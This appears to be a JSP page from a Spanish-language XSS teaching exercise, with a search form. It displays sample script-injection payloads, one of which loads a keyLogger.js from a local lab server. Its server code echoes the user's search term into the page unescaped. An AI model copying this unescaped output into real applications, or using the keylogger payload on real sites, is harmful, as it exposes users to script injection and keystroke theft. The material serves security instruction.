<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
    
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Insert title here</title>
</head>

<script type="text/javascript" src="avisoTimeout.jsp"></script>


<script type="text/javascript" nonce="${nonce}">

	function saludar(){
		alert("Mensaje")
	}
	
	saludar()

</script>

<body>

	<h1 align="center">
		<font color="green">
			Pagina de inicio. Usuario: ${usuario.nombre}
		</font>
	</h1>
		
	<form action="../SVLogin" method="post">
		<input type="hidden" name="accion" value="logout"/>		
		<p align="center">
			<input type="submit" value="salir"/>
		</p>
	</form>
	
	<form action="SVBusquedas">
		<p align="center">
			Introduzca un criterio de búsqueda 
			<input type="text" name="criterio"/>
			<input type="submit" value="Buscar"/>
			<input type="button" value="Dale" onclick="saludar()"/>
		</p>
	</form>
	
	<p align="center">
		&lt;script type="application/javascript">alert("HOLA")&lt;/script>
	</p>
	
	<p align="center">
		&lt;script type="text/javascript" src="http://localhost:8081/Ej08_XSS_EjemplosAtaque_Indeseables/keyLogger.js">&lt;/script>
	</p>	
	
	<%
	String criterio  = (String) request.getAttribute("criterio");
	String resultado = (String) request.getAttribute("resultado"); 
	
	if( criterio!=null ){	
		out.println("<h2 align=center>Resultados de la busqueda para "+criterio+"</h2>");
		out.println("<p align=center>"+resultado+"</p>");
	}	
	%>

</body>
</html>